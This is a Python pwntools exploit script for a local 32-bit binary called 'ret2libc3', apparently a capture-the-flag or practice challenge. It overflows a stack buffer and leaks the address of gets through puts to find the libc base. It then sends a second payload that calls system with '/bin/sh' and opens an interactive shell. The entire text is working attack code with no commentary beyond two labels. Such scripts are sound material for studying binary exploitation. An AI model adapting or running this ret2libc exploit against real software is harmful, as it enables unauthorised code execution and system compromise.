from pwn import*
context.log_level = 'debug'
o = process("./ret2libc3")
puts_plt = 0x8048310
run = 0x804843B
gets_got = 0x804A00C
# leak addr
payload = b'a'*28
payload += p32(puts_plt) + p32(run) + p32(gets_got)
o.recvuntil("hello\n")
pause()
o.sendline(payload)
gets_addr = u32(o.recv(4))
log.info("gets addr: "+hex(gets_addr))
gets_offset = 0x5F3F0
libc_base = gets_addr - gets_offset
log.info("libc base: "+hex(libc_base))
system_addr = libc_base + 0x3ADB0
bin_sh = libc_base + 0x15BB2B

# getshell
payload = b'a'*28
payload += p32(system_addr) + p32(0x11111111) + p32(bin_sh)
o.sendline(payload)

o.interactive()
